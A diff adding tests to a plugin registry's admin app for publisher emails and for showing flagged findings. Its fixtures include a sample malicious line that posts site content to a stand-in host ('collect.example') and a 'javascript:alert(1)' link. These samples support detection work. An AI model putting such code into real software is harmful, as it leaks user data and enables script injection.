@@ -16,8 +16,12 @@ const api = vi.hoisted(() => ({
 	getIssuance: vi.fn(),
 	getActivity: vi.fn(),
 	assessmentAction: vi.fn(),
+	notifyPublisher: vi.fn(),
 	setIssuance: vi.fn(),
 	setTakedown: vi.fn(),
+	assessmentMediaUrl: vi.fn(
+		(runKey: string, kind: string, index: number) => `/media/${runKey}/${kind}/${index}`,
+	),
 }));
 
 vi.mock("../../src/admin/api.js", () => api);
@@ -49,6 +53,7 @@ beforeEach(() => {
 	api.getIssuance.mockResolvedValue({ paused: false, updatedAt: null });
 	api.getActivity.mockResolvedValue({ items: [] });
 	api.assessmentAction.mockResolvedValue({});
+	api.notifyPublisher.mockResolvedValue({});
 });
 
 afterEach(() => {
@@ -201,6 +206,200 @@ describe("labeler admin application", () => {
 		expect(confirm.hasAttribute("disabled")).toBe(false);
 		fireEvent.click(confirm);
 		await waitFor(() => expect(api.assessmentAction).toHaveBeenCalledWith(item, "approve", ""));
+	});
+});
+
+describe("emailing a publisher about code findings", () => {
+	const item = assessment("gallery-release", "review");
+	const draft = {
+		recipients: ["security@example.test"],
+		subject: "Review findings for Gallery 1.2.3 on the EmDash plugin registry",
+		text: "1. Vulnerability (high severity)\n   A public route returns draft posts.",
+	};
+
+	function detail(record: null | { status: "sent"; recipients: string[]; sentAt: string }) {
+		return {
+			assessment: { ...item, canonicalInput: { input: { name: "Gallery", slug: "gallery" } } },
+			findings: [],
+			manualDecision: null,
+			publisherNotification: { draft, record },
+		};
+	}
+
+	function renderAs(roles: string[]) {
+		window.history.replaceState(null, "", "/_admin/assessments");
+		api.getSession.mockResolvedValue({
+			authenticated: true,
+			identity: { kind: "human", principal: "op@example.com", actorDid: "did:web:op", roles },
+		});
+		api.getAssessments.mockResolvedValue({ items: [item] });
+		render(
+			<I18nProvider i18n={i18n}>
+				<Toasty>
+					<App />
+				</Toasty>
+			</I18nProvider>,
+		);
+	}
+
+	it("lets an administrator preview and send the email", async () => {
+		api.getAssessment.mockResolvedValue(detail(null));
+		renderAs(["admin"]);
+
+		fireEvent.click(await screen.findByRole("button", { name: "Email publisher" }));
+		expect(
+			await screen.findByText(/to security@example\.test\. Your reason is recorded/),
+		).toBeTruthy();
+		expect(screen.getByText(draft.subject)).toBeTruthy();
+		expect(screen.getByText(/A public route returns draft posts\./)).toBeTruthy();
+		fireEvent.change(screen.getByRole("textbox", { name: "Reason" }), {
+			target: { value: "Share the findings" },
+		});
+		fireEvent.click(screen.getAllByRole("button", { name: "Email publisher" }).at(-1)!);
+		await waitFor(() =>
+			expect(api.notifyPublisher).toHaveBeenCalledWith(item, "Share the findings"),
+		);
+	});
+
+	it("hides the action from reviewers", async () => {
+		api.getAssessment.mockResolvedValue(detail(null));
+		renderAs(["reviewer"]);
+
+		expect((await screen.findAllByText("Gallery")).length).toBeGreaterThan(0);
+		expect(screen.queryByRole("button", { name: "Email publisher" })).toBeNull();
+	});
+
+	it("shows when the publisher was already emailed instead of offering to send again", async () => {
+		api.getAssessment.mockResolvedValue(
+			detail({ status: "sent", recipients: draft.recipients, sentAt: "2026-11-16T11:00:00.000Z" }),
+		);
+		renderAs(["admin"]);
+
+		expect(await screen.findByText(/^Publisher emailed /)).toBeTruthy();
+		expect(screen.queryByRole("button", { name: "Email publisher" })).toBeNull();
+	});
+});
+
+describe("assessment findings", () => {
+	it("shows who raised each finding, the cited code and the flagged link", async () => {
+		window.history.replaceState(null, "", "/_admin/assessments");
+		const item = assessment("gallery-release", "review");
+		api.getAssessments.mockResolvedValue({ items: [item] });
+		api.getAssessment.mockResolvedValue({
+			assessment: {
+				...item,
+				canonicalInput: {
+					input: {
+						name: "Gallery",
+						slug: "gallery",
+						media: [
+							{ kind: "screenshot", index: 0 },
+							{ kind: "screenshot", index: 1 },
+						],
+					},
+					text: [{ ref: "profile.name", value: "Gallery", format: "plain" }],
+					links: [
+						{
+							ref: "profile.sections.faq.links[0]",
+							url: "javascript:alert(1)",
+							usage: "markdown",
+							issues: ["unsupported-scheme"],
+						},
+					],
+				},
+				summary: {
+					reasonCodes: ["policy-finding"],
+					codeReviews: [
+						{
+							model: "anthropic/claude-opus-5-5",
+							promptVersion: "v1",
+							summary: "Posts leave the site.",
+							findingCount: 1,
+						},
+						{
+							model: "openai/gpt-6.1-sol",
+							promptVersion: "v1",
+							summary: "Flagged for possible biological risk.",
+							findingCount: 0,
+							declined: true,
+						},
+					],
+				},
+			},
+			findings: [
+				{
+					finding_index: 0,
+					category: "malicious-code",
+					confidence: 0.9,
+					reason_code: "policy-finding",
+					public_summary: "Sends every published post to an undeclared host.",
+					evidenceRefs: ["release.package:backend.js#L2"],
+					severity: "critical",
+					source: "anthropic/claude-opus-5-5",
+					excerpts: [
+						{
+							ref: "release.package:backend.js#L2",
+							startLine: 1,
+							lines: ["export default {", "  fetch('https://collect.example', { body })", "};"],
+						},
+					],
+					created_at: "2026-08-27T10:00:00.000Z",
+				},
+				{
+					finding_index: 1,
+					category: "malicious-or-deceptive-link",
+					confidence: 1,
+					reason_code: "policy-finding",
+					public_summary: "Displayed link requires operator review.",
+					evidenceRefs: ["profile.sections.faq.links[0]"],
+					severity: null,
+					source: "link-check",
+					created_at: "2026-08-27T10:00:00.000Z",
+				},
+				{
+					finding_index: 2,
+					category: "explicit-sexual-content",
+					confidence: 0.82,
+					reason_code: "policy-finding",
+					public_summary:
+						"Clef scored explicit-sexual-content at 0.820, above its threshold of 0.45.",
+					evidenceRefs: ["release.media.screenshot:1"],
+					severity: null,
+					source: "@cf/cloudflare/clef",
+					created_at: "2026-08-27T10:00:00.000Z",
+				},
+			],
+			manualDecision: null,
+		});
+
+		render(
+			<I18nProvider i18n={i18n}>
+				<Toasty>
+					<App />
+				</Toasty>
+			</I18nProvider>,
+		);
+
+		expect(await screen.findByText("Posts leave the site.")).toBeTruthy();
+		expect(screen.getByText("Declined to review")).toBeTruthy();
+		expect(screen.getByText("Malicious code")).toBeTruthy();
+		expect(screen.getByText("Critical")).toBeTruthy();
+		expect(screen.getByText("anthropic/claude-opus-5-5 · 90% confidence")).toBeTruthy();
+		expect(screen.getByText("backend.js:2")).toBeTruthy();
+		expect(
+			screen.getByText("fetch('https://collect.example', { body })", { exact: false }),
+		).toBeTruthy();
+		expect(screen.getByText("javascript:alert(1)")).toBeTruthy();
+		expect(screen.getByText("link-check · 100% confidence")).toBeTruthy();
+		expect(screen.getByText("Link check: unsupported-scheme")).toBeTruthy();
+		expect(screen.getAllByRole("img", { name: "Submitted screenshot" })).toHaveLength(1);
+		expect(screen.queryByRole("img", { name: "Flagged screenshot" })).toBeNull();
+		const show = screen.getAllByRole("button", { name: "Show flagged image" });
+		expect(show).toHaveLength(2);
+		fireEvent.click(show[1]!);
+		expect(screen.getByRole("img", { name: "Flagged screenshot" }).getAttribute("src")).toBe(
+			"/media/gallery-release/screenshot/1",
+		);
 	});
 });
 
